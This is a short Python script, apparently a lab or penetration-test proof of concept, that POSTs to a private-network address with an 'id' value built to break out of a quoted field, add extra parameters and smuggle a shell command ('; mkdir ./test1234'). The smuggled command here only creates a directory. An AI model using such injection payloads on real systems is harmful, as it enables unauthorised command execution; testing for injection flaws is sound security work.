import requests

url = "http://172.16.21.211"
payload = {"id": "itsin'&pwd=1234&no=2; mkdir ./test1234"}

r = requests.post(url, data=payload)
print(r.text)